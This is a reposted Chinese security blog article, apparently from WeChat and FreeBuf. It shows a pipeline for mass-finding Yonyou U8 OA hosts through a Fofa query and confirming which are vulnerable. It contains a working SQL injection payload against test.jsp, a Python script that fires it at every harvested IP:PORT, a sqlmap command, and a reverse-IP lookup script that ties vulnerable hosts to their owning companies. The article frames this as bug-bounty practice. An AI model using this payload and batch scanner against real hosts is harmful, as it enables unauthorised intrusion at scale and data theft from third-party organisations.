---
title: 一条Fofa搜索语法，如何实现批量挖洞
url: https://mp.weixin.qq.com/s/DmHizr3znkAa2ioDs_emrA
source: Doonsec's feed
date: 2026-10-05
fetch_date: 2026-10-06T08:20:55.939384
---

# 一条Fofa搜索语法，如何实现批量挖洞

# 一条Fofa搜索语法，如何实现批量挖洞

点击关注👉
点击关注👉

马哥网络安全

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

扫码加好友

获学习资料

![](https://mmbiz.qpic.cn/mmbiz_png/2I159AwKj56GWlFpAuJBpDq9xgZp8de9R91BMgAgGaf5D4gwsyWl1FR9RN64BiaJqzxqDicCAgoKtwb9LPrZm4c15qTds6Ux29Cda2avFL0mY/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic#imgIndex=1)

#

网络安全领域各种资源，EDUSRC证书站挖掘、红蓝攻防、渗透测试等优质文章，以及工具分享、前沿信息分享、POC、EXP分享。不定期分享各种好玩的项目及好用的工具，欢迎关注。加内部圈子，文末有彩蛋（知识星球优惠卷）。

#

文章作者：Jerrytqq

文章来源：https://www.freebuf.com/articles/web/274071.html

01

0x1 一条Fofa搜索语法，如何实现批量挖洞

## 前言

最近在学习如何批量验证POC，期间也参考了不少文章，于是萌生了整合出一个自动化批量挖洞的想法。

* 本项目源码：https://github.com/h2so0o4/Fuck\_SRC

最终实现效果为：**仅通过一条Fofa搜索语法，就可以挖出可供提交公益SRC的漏洞**

流程包括:

1、前期的信息收集（FOFA）
2、中期的漏洞验证（Python批量脚本）
3、后期的IP反查（Python批量脚本）

本次采用"**用友 U8 OA SQL注入漏洞**"来演示整个自动化流程。
这个漏洞的POC很简单，这里直接附上，详情需要的话网上有很多。

* POC：`http://IP:PORT/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))`

## 信息收集

众所周知，信息收集是渗透测试中最关键的环节。

信息收集阶段我们的主要目标是：

1、找到网上公开的漏洞POC

2、找出可能存在该漏洞的IP列表

这里我先推荐2个我经常逛的漏洞文库。

白阁文库

PeiQi WiKi-POC文库

文章后续的POC也参考了文库中的信息。

## **正文开始**

本次采用Fofa搜索引擎来收集可能存在漏洞的IP。

Fofa语句：`title="用友U8-OA"`

考虑到后续需要把Fofa收集到的IP列表导出给脚本批量验证，这里使用Github开源工具Fofa-collect
这个工具使用方式很简单，只需要配置好你的Fofa邮箱和API，就可以直接输入Fofa语法，得到查询结果。

我的使用流程如下：

1、在Fofa-collect中输入Fofa语法 -> 得到IP:PORT列表
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0JEGQPERM53t8LWhYd8yx4okZFDIIjxoGTajR2Z4iabHX45ZdUwStzFaAetmE81T3BibWL78llMZA/640?wx_fmt=png&from=appmsg&watermark=1#imgIndex=2)

2、导出保存为IP.txt
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0JEGQPERM53t8LWhYd8yxEBZACoHa0RJeQrQgwMVNcw4MyBcub05AUnxBsIHLVHJVOyLsSSXtAA/640?wx_fmt=png&from=appmsg&watermark=1#imgIndex=3)

至此，信息收集流程结束。

## POC批量验证

POC批量验证阶段我们的主要目标是：

1、编写或使用POC，找出IP列表中真正存在漏洞的IP

```
POC批量验证的脚本在PeiQi文库的POC基础上进一步改写，支持批量导入IP.txt，并导出存在漏洞的URL，保存为urls.txt。
```

原POC链接

```
import requests
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

ip = []  # 用于存放存在漏洞的URL地址

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mTitle   : 用友 U8 OA test.jsp SQL注入漏洞                           \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mFile         >>> ip.txt                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url) -> bool:
    vuln_url = target_url + "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(1))"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        # 漏洞验证成功的条件
        if "c4ca4238a0b923820dcc509a6f75849b" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 \n[o] 响应地址: {} \033[0m".format(target_url, vuln_url))
            ip.append(vuln_url)
        else:
            print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url))

if __name__ == '__main__':
    title()
    with open('ip.txt', 'r', encoding='utf-8') as f:
        g = f.read()
    a = re.findall('\d{1,3}[.]\d{1,3}[.]\d{1,3}[.]\d{1,3}[:]\d+', g)  # 提取为IP:PORT的形式

    # 逐个验证IP.txt
    for i in a:
        if 'http' in i:
            target_url = str(i)
        else:
            target_url = 'http://' + str(i)
        print(target_url)
        core_name = POC_1(target_url)

    # 将存在漏洞的URL写入url.txt
    with open("urls.txt", "w") as f:
        for i in ip:
            if i != '':
                f.write(i + "\n")

    print(ip)  # 最终打印所有存在漏洞的IP
```

可以看到运行结果中有存在漏洞的URL，并且已经存入了urls.txt
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0JEGQPERM53t8LWhYd8yxRrbRH1bPnenIF7jt7r60oj2FqvltzoVggCqGHV19pu54RddgF3Au3Q/640?wx_fmt=png&from=appmsg&watermark=1#imgIndex=4)

我们随便挑选一个URL，用sqlmap跑一下

```
python sqlmap.py -u "http://IP:PORT/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(1))" -p "S1"
```

可以看到是存在注入点的（再次强调渗透测试点到为止，提交漏洞只需要跑出数据库名证明漏洞存在，信息安全三要素CIA时刻铭记于心hhh）
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0JEGQPERM53t8LWhYd8yxfEEicuXqrthXDbPB3Ym54gGuuHnZiaf6pBoJLo9RSBh3icYSsSXwJN6Vw/640?wx_fmt=png&from=appmsg&watermark=1#imgIndex=5)

其实文章到这里为止，就可以证明漏洞存在了，但是根据我在漏洞盒子刷公益SRC的经验来看，**SRC漏洞需明确归属单位,只有ip或是非明确单位的域名暂不收录**，所以光有IP还不够，需要我们去把这些存在漏洞的IP，通过IP反查域名，找出域名，再找出域名所属的单位，这样才能算得上是一个可以提交的漏洞。（例如你挖出 IP地址 39.156.69.79存在漏洞，但是这样的漏洞一般不收，你需要去查出这个IP 39.156.69.79对应的域名是baidu.com，而baidu.com背后的单位是百度公司，将**IP、域名、公司名称**这些信息一并提交才行）

于是就有了下一个模块，批量IP反查。

## 批量IP反查域名

**这个阶段我们的主要目标是：**

1、已知urls.txt中的IP存在漏洞，找出这些IP对应的域名，并找到域名所属单位

要想批量IP反查域名，找到一个合适的接口是首先要考虑的问题，下面我列出几个可以IP反查域名的网站：

https://dns.aizhan.com/=
https://www.yougetsignal.com/tools/web-sites-on-web-server/
https://tools.ipip.net/ipdomain.php?ip=

这里我选择了使用第一个接口https://dns.aizhan.com/=

```
这部分的代码完全由我自己编写。通过Python语言，利用requests包模拟浏览器请求，BeautifulSoup包来提取页面内容，最终得到IP对应的域名。
```

```
#!/usr/bin/python
# -*- coding: UTF-8 -*-
# @date: 2021/5/16 20:02
# @name: ip反查域名
# @author：h2o0o4

'''
需要注意的问题：
有时候没有一个IP能反查出域名，可能是因为你的IP被网站ban了，而不是查不出来，试着挂个代理
这个接口有时候会因为你的频繁访问而拒绝服务，但是有时候是可以跑出结果的。
'''
import re
import requests
from bs4 import BeautifulSoup
from urllib3.exceptions import InsecureRequestWarning

list = []  # 用于存放可以通过IP反查到域名的域名

def searchIP(ip: str):
    ip = re.findall('\d{1,3}[.]\d{1,3}[.]\d{1,3}[.]\d{1,3}', ip)[0]
    print("IP:{}".format(ip))
    url = "https://dns.aizhan.com/" + ip + "/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=url, headers=headers, verify=False, timeout=5)
        # title = re.findall("charset=utf-8;<span>(.*?)</span>", response.text)[0]
        # print(response.text)
        soup = BeautifulSoup(response.text, "html.parser")
        for t in soup.find_all('td'):
            a = t.find_all('a')
            if a:
                for j in range(len(a)):
                    url = a[j].attrs['href']
                    print(ip+"反查出的URL:"+url)
                    list.append(ip+":"+url)
    except:
        print("\033[31m[x] 请求错误 \033[0m")

if __name__ == '__main__':
    with open('urls.txt', 'r', encoding='utf-8') as f:
        for line in f:
            searchIP(line)

# 写入文件
with open("result.txt", "w") as f:
    for i in list:
        if i != '':
            f.write(i + "\n")
```

运行完成后，可以看到result.txt中出现了一些IP对应的域名
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0JEGQPERM53t8LWhYd8yxCOZA81cBEq4gtC8k9xZMDR2tTnOMicfIBAWeNgPjmY69PZ4x6ibMTkAQ/640?wx_fmt=png&from=appmsg&watermark=1#imgIndex=6)

这时候我们只需要去访问域名，就可以知道这个IP对应的公司。

于是我们就可以拿着这些信息去提交漏洞了！

**至此，整个流程结束。**

可以看到我们通过 一条Fofa语句 和 一个POC ，就可以在短时间内快速找到可以提交公益SRC的漏洞，在拿到新的POC时，仅需替换POC\_1()函数，代码稍加改动，就可以实现另一个漏洞的批量挖掘。

## 总结

比较遗憾的地方

这个文章里用的POC是我在PeiQi文库提供的POC基础上改的，所以说并不是原创，但是这也是一个学习的过程，多看看别人的，慢慢的自己就也能上手写了，这也标志这我正在从一个脚本小子变成代码大师（开玩笑）。

为什么不用现有的POC批量工具？

我有了解到POC-T是一个很棒的POC批量验证工具，同时goby里也支持json格式导入POC验证模块，这些都是非常高效且便利的。不过我认为我的学习时间还长，要尽量从基础学起，这就需要动手写写代码，理解那些工具底层用的什么逻辑。

可能在一些大佬眼里，我这个小项目就是一个缝合怪，不过我认为这是我学习的一个记录，还希望口下留情。

![](https://mmbiz.qpic.cn/mmbiz_png/INa3lxHH4I2aV3zCmfiaj4cXeQ2HQd6s53wJS36HYI65ib48fujDK8najfWiahicsljzsdT3dfVS8HHyxaviaSd8g2g/640?wxfrom=5&wx_lazy=1&wx_fmt=png&wx_co=1)

**今...